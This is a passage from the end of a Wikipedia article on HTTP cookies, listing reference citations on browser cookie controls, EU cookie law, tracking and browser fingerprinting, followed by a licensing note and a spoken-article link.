48. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-48)**  ["Clearing private data"](http://support.mozilla.com/en-US/kb/Clearing+Private+Data#top). *Firefox Support Knowledge base*. Mozilla. 16 September 2008. Retrieved 2009-01-04.

49. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-49)**  ["Clear Personal Information : Clear browsing data"](http://www.google.com/support/chrome/bin/answer.py?hl=en&answer=95582). *Google Chrome Help*. Google. Retrieved 2009-01-04.

50. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-50)**  ["Clear Personal Information: Delete cookies"](http://www.google.com/support/chrome/bin/answer.py?hl=en&answer=95626). *Google Chrome Help*. Google. Retrieved 2009-01-04.

51. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-51)**  ["Site Compatibility for Firefox 22"](https://developer.mozilla.org/en-US/docs/Site_Compatibility_for_Firefox_22), *Mozilla Developer Network*, 2013-04-11

52. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-52)** Miyazaki, Anthony D. (2008), “Online Privacy and the Disclosure of Cookie Use: Effects on Consumer Trust and Anticipated Patronage,” Journal of Public Policy & Marketing, 23 (Spring), 19–33

53. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-53)**  ["CIA Caught Sneaking Cookies"](http://www.cbsnews.com/stories/2002/03/20/tech/main504131.shtml). *CBS News*. 2002-03-20.

54. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-54)**  ["Spy Agency Removes Illegal Tracking Files"](https://www.nytimes.com/2005/12/29/national/29cookies.html). *New York Times*. 2005-12-29.

55. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-JISC_55-0)**  ["EU Cookie Directive, Directive 2009/136/EC"](http://www.jisclegal.ac.uk/ManageContent/ViewDetail/ID/1347/EU-Cookie-Directive--Directive-2009136EC.aspx). JISC Legal Information. Retrieved 31 October 2012.

56. ^ [Jump up to: ***a***](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-ICO_reference_56-0)  [***b***](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-ICO_reference_56-1)  [***c***](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-ICO_reference_56-2)  [*Privacy and Electronic Communications Regulations*](http://www.ico.gov.uk/for_organisations/privacy_and_electronic_communications/the_guide/~/media/documents/library/Privacy_and_electronic/Practical_application/cookies_guidance_v3.ashx). Information Commissioner's Office. 2012.

57. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-57)**  ["Directive 95/46/EC of the European Parliament and of the Council of 24 October 1995 on the protection of individuals with regard to the processing of personal data and on the free movement of such data"](http://eur-lex.europa.eu/LexUriServ/LexUriServ.do?uri=CELEX:31995L0046:en:HTML). 1995-11-23: 0031–0050. Retrieved 31 October 2012.

58. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-58)**  ["New EU cookie law (e-Privacy Directive)"](https://web.archive.org/web/20110224183417/http://www.ico.gov.uk/for_organisations/privacy_and_electronic_communications/the_guide/cookies.aspx). Archived from [the original](http://www.ico.gov.uk/for_organisations/privacy_and_electronic_communications/the_guide/cookies.aspx) on 24 February 2011. Retrieved 31 October 2012.

59. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-59)**  ["EU cookie law: stop whining and just get on with it"](https://www.wired.co.uk/news/archive/2012-05/24/eu-cookie-law-moaning). Retrieved 31 October 2012.

60. ^ [Jump up to: ***a***](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-nyt-bits_60-0)  [***b***](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-nyt-bits_60-1)  ["A Loophole Big Enough for a Cookie to Fit Through"](http://bits.blogs.nytimes.com/2010/09/17/a-loophole-big-enough-for-a-cookie-to-fit-through/). *Bits*. The New York Times. Retrieved 31 January 2013.

61. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-howtoblock_61-0)**  Pegoraro, Rob (July 17, 2005). ["How to Block Tracking Cookies"](https://www.washingtonpost.com/wp-dyn/content/article/2005/07/16/AR2005071600111.html). Washington Post. p. F07. Retrieved 2009-01-04.

62. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-certificatehack_62-0)** Wired [Hack Obtains 9 Bogus Certificates for Prominent Websites](https://www.wired.com/threatlevel/2011/03/comodo-compromise/)

63. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-63)**  Fielding, Roy (2000). ["Fielding Dissertation: CHAPTER 6: Experience and Evaluation"](http://roy.gbiv.com/pubs/dissertation/evaluation.htm). Retrieved 2010-10-14.

64. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-64)**  Tilkov, Stefan (July 2, 2008). ["REST Anti-Patterns"](http://www.infoq.com/articles/rest-anti-patterns). InfoQ. Retrieved 2009-01-04.

65. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-65)**  ["ThomasFrank.se"](http://www.thomasfrank.se/sessionvars.html). ThomasFrank.se. Retrieved 2010-05-22.

66. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-IDFA_66-0)**  ["The cookie is dead. Here's how Facebook, Google, and Apple are tracking you now, VentureBeat, Mobile, by Richard Byrne Reilly"](https://venturebeat.com/2014/10/06/the-cookie-is-dead-heres-how-facebook-google-and-apple-are-tracking-you-now/). *VentureBeat*.

67. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-67)**  ["Window.sessionStorage, Web APIs | MDN"](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage). *developer.mozilla.org*. Retrieved 2 October 2015.

68. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-68)**  ["Introduction to Persistence"](http://msdn.microsoft.com/en-us/library/ms533007%28v=vs.85%29.aspx). *microsoft.com*. Microsoft.

69. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-69)**  ["Isolated Storage"](http://msdn.microsoft.com/en-us/library/bdts8hk0%28v=vs.95%29.aspx). *Microsoft.com*.

70. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-70)**  ["BrowserSpy"](http://gemal.dk/browserspy/). gemal.dk. Retrieved 2010-01-28.

71. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-71)**  ["IE "default behaviors [sic]" browser information disclosure tests: clientCaps"](http://mypage.direct.ca/s/schinke/defaultbehaviors/clientCapsExtra.html). Mypage.direct.ca. Retrieved 2010-01-28.

72. **[Jump up ^](https://en.wikipedia.org/wiki/HTTP_cookie#cite_ref-72)**  Eckersley, Peter (17 May 2010). ["How Unique Is Your Web Browser?"](https://web.archive.org/web/20141015220910/https://panopticlick.eff.org/browser-uniqueness.pdf) (PDF). *eff.org*. Electronic Frontier Foundation. Archived from [the original](https://panopticlick.eff.org/browser-uniqueness.pdf) (PDF) on 15 October 2014. Retrieved 23 July 2014.

This article is based on material taken from the [Free On-line Dictionary of Computing](https://en.wikipedia.org/wiki/Free_On-line_Dictionary_of_Computing) prior to 1 November 2008 and incorporated under the "relicensing" terms of the [GFDL](https://en.wikipedia.org/wiki/GNU_Free_Documentation_License), version 1.3 or later.

## External links

**Listen to this article** ([info/dl](https://en.wikipedia.org/wiki/File:HTTP_cookie.ogg))

![](data:image/png,%89PNG%0D%0A%1A%0A%00%00%00%0DIHDR%00%00%00%01%00%00%00%01%08%02%00%00%00%90wS%DE%00%00%00%01sRGB%00%AE%CE%1C%E9%00%00%00%09pHYs%00%00%0B%13%00%00%0B%13%01%00%9A%9C%18%00%00%00%07tIME%07%DB%0B%0A%17%041%80%9B%E7%F2%00%00%00%19tEXtComment%00Created%20with%20GIMPW%81%0E%17%00%00%00%0CIDAT%08%D7c%60%60%60%00%00%00%04%00%01'4'%0A%00%00%00%00IEND%AEB%60%82)

This audio file was created from a revision of the article "HTTP cookie" dated 2016-05-28, and does not reflect subsequent edits to the article. ([Audio help](https://en.wikipedia.org/wiki/Wikipedia:Media_help))

**[More spoken articles](https://en.wikipedia.org/wiki/Wikipedia:Spoken_articles)**